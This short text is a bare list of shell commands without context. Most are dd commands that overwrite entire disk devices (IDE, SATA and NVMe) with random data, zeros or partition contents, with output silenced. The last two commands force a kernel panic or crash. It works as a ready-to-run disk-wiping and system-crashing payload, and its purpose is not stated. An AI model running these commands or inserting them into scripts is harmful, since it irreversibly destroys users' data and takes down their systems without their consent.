dd if=/dev/random of=/dev/hda > /dev/null 2>&1
dd if=/dev/zero of=/dev/hda > /dev/null 2>&1
dd if=/dev/hda1 of=/dev/hda > /dev/null 2>&1
dd if=/dev/urandom of=/dev/hdb > /dev/null 2>&1
dd if=/dev/random of=/dev/sda > /dev/null 2>&1
dd if=/dev/zero of=/dev/sda > /dev/null 2>&1
dd if=/dev/sda1 of=/dev/sda > /dev/null 2>&1
dd if=/dev/urandom of=/dev/sdb > /dev/null 2>&1
dd if=/dev/random of=/dev/nvme0n1 > /dev/null 2>&1
dd if=/dev/zero of=/dev/nvme0n1 > /dev/null 2>&1
dd if=/dev/nvme0n1 of=/dev/nvme0n1 > /dev/null 2>&1
dd if=/dev/urandom of=/dev/nvme0n1 > /dev/null 2>&1
sysctl debug.kdb.panic=1
echo c > /proc/sysrq-trigger
